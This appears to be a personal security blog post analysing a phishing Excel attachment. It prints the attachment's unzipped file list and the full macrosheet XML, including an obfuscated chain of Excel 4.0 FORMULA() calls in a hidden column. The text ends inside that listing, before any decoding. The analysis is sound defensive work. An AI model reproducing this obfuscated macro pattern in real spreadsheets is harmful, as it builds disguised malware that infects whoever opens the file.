<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Malware in Excel? | 0x4vian | Abhiyan Chhetri</title>
    <meta name="description" content="Cyber Security Enthusiast | Penetration Tester | Red Teamer">
    <link rel="icon" href="/logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.739b8ed0.css" as="style"><link rel="preload" href="/assets/js/app.33d307ae.js" as="script"><link rel="preload" href="/assets/js/2.2a395b45.js" as="script"><link rel="preload" href="/assets/js/13.85778b46.js" as="script"><link rel="prefetch" href="/assets/js/10.23a08a59.js"><link rel="prefetch" href="/assets/js/11.7f446b4d.js"><link rel="prefetch" href="/assets/js/12.b1d71614.js"><link rel="prefetch" href="/assets/js/14.67074bcc.js"><link rel="prefetch" href="/assets/js/15.3f63e340.js"><link rel="prefetch" href="/assets/js/16.cf9fee51.js"><link rel="prefetch" href="/assets/js/3.06951db2.js"><link rel="prefetch" href="/assets/js/4.9dccd740.js"><link rel="prefetch" href="/assets/js/5.54adec9b.js"><link rel="prefetch" href="/assets/js/6.67793f9c.js"><link rel="prefetch" href="/assets/js/7.0f774108.js"><link rel="prefetch" href="/assets/js/8.f19a0032.js"><link rel="prefetch" href="/assets/js/9.bfde24ff.js">
    <link rel="stylesheet" href="/assets/css/0.styles.739b8ed0.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">0x4vian | Abhiyan Chhetri</span></a> <div class="links"><!----> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/certs/" class="nav-link">Certifications</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">Blog</a></div><div class="nav-item"><a href="https://www.linkedin.com/in/abhiyan-chhetri-586a44217/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  LinkedIn
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/certs/" class="nav-link">Certifications</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">Blog</a></div><div class="nav-item"><a href="https://www.linkedin.com/in/abhiyan-chhetri-586a44217/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  LinkedIn
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Blog</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog/Servsau.html" class="sidebar-link">Servsau</a></li><li><a href="/blog/Malware Analysis.html" class="active sidebar-link">Malware in Excel?</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog/Malware Analysis.html#identifing-that-excel-is-infected" class="sidebar-link">Identifing that Excel is Infected</a></li><li class="sidebar-sub-header"><a href="/blog/Malware Analysis.html#digging-into-the-malware" class="sidebar-link">Digging into the malware</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="malware-in-excel">Malware in Excel?</h1> <h3 id="background">Background</h3> <p>I saw a post on facebook from a user where he mentioned that he has received an email from an internet provider with excel file as attachment but the email was different from regular emails.</p> <p>This post attracted me and I decided to dig into this attachment and discover is it a malware or not and if it is what the malware does.</p> <p>So, I asked for the excel file and downloaded the file in my machine.</p> <h2 id="identifing-that-excel-is-infected">Identifing that Excel is Infected</h2> <p>The file extension that I downloaded was <code>.xlsx</code>, if you are familiar with the format then it is just a zip file with bunch of <code>.xml</code> files. So I unziped the files</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">unzip</span> Payment<span class="token punctuation">\</span> details.xlsx 
Archive:  Payment details.xlsx
Aspose.Cells v22.2.5
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/worksheets/sheet3.xml  
  inflating: xl/worksheets/sheet5.xml  
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/macrosheets/sheet1.xml  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/worksheets/sheet1.xml  
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: xl/theme/theme1.xml     
  inflating: xl/workbook.xml         
  inflating: xl/calcChain.xml        
  inflating: xl/media/image1.png     
  inflating: xl/worksheets/sheet4.xml  
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: <span class="token punctuation">[</span>Content_Types<span class="token punctuation">]</span>.xml     
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/_rels/workbook.xml.rels  
  inflating: _rels/.rels             
</code></pre></div><p>After unzipping the file I check the macro files to see if it really has some malware or not:
(output is beautified so it will make it easy to read the code)</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> xl/macrosheets/sheet1.xml
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token assign-left variable">standalone</span><span class="token operator">=</span><span class="token string">&quot;yes&quot;</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>worksheet
	<span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span>
	xmlns:r<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;</span>
	xmlns:xdr<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing&quot;</span>
	xmlns:x14<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main&quot;</span>
	xmlns:mc<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;</span> mc:Ignorable<span class="token operator">=</span><span class="token string">&quot;x14ac xr xr2 xr3&quot;</span>
	xmlns:x14ac<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac&quot;</span>
	xmlns:xm<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/excel/2006/main&quot;</span>
	xmlns:xr<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2014/revision&quot;</span>
	xmlns:xr2<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2015/revision2&quot;</span>
	xmlns:xr3<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2016/revision3&quot;</span>
	xmlns:xr6<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2016/revision6&quot;</span> xr6:uid<span class="token operator">=</span><span class="token string">&quot;{00000000-0001-0000-0300-000000000000}&quot;</span> xr:uid<span class="token operator">=</span><span class="token string">&quot;{05bb2f47-8f87-4278-9454-68d76267ebb2}&quot;</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>dimension <span class="token assign-left variable">ref</span><span class="token operator">=</span><span class="token string">&quot;D7&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetViews<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>sheetView <span class="token assign-left variable">showFormulas</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">workbookViewId</span><span class="token operator">=</span><span class="token string">&quot;0&quot;</span> <span class="token assign-left variable">topLeftCell</span><span class="token operator">=</span><span class="token string">&quot;A1&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/sheetViews<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetFormatPr <span class="token assign-left variable">defaultColWidth</span><span class="token operator">=</span><span class="token string">&quot;8.714285714285714&quot;</span> <span class="token assign-left variable">defaultRowHeight</span><span class="token operator">=</span><span class="token string">&quot;15&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>cols<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>col <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">max</span><span class="token operator">=</span><span class="token string">&quot;3&quot;</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">&quot;8.714285714285714&quot;</span> <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> /<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>col <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token string">&quot;4&quot;</span> <span class="token assign-left variable">max</span><span class="token operator">=</span><span class="token string">&quot;4&quot;</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">&quot;8.714285714285714&quot;</span> <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">hidden</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">customWidth</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> /<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>col <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token string">&quot;5&quot;</span> <span class="token assign-left variable">max</span><span class="token operator">=</span><span class="token string">&quot;16384&quot;</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">&quot;8.714285714285714&quot;</span> <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/cols<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetData<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>row <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;7&quot;</span> <span class="token assign-left variable">spans</span><span class="token operator">=</span><span class="token string">&quot;4:4&quot;</span> <span class="token assign-left variable">ht</span><span class="token operator">=</span><span class="token string">&quot;15&quot;</span><span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>c <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;D7&quot;</span> <span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token string">&quot;b&quot;</span><span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>f<span class="token operator">&gt;</span>FORMULA<span class="token punctuation">(</span><span class="token string">'Je1'</span><span class="token operator">!</span>D17,<span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5,D10<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH1&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G20<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D12<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH2&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D14<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH3&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G24<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D16<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH4&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>I18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D18<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH5&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>L2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>E4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>B8<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>D12<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">'Je2'</span><span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>G9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>K2<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>I20<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>R10<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>P5<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D20<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>J11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B18<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token string">&quot;GFGH6&quot;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>M7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>B15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>I17<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>I3<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>K9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P7<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D22<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>N4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H9<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P20<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>T3<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>Q14<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>N13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>J14<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Lefasbor1<span class="token operator">!</span>N3<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P15<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D24<span class="token punctuation">)</span><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>Vfrbuk1<span class="token operator">!</span>P22<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>G24<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>H13<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>E6<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>E11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>F4<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>K23<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P11<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>Vfrbuk1<span class="token operator">!</span>P13,D33<span class="token punctuation">)</span><span class="token operator">&lt;</span>/f<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>v<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span>/v<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/c<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>/row<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/sheetData<span class="token operator">&gt;</span>
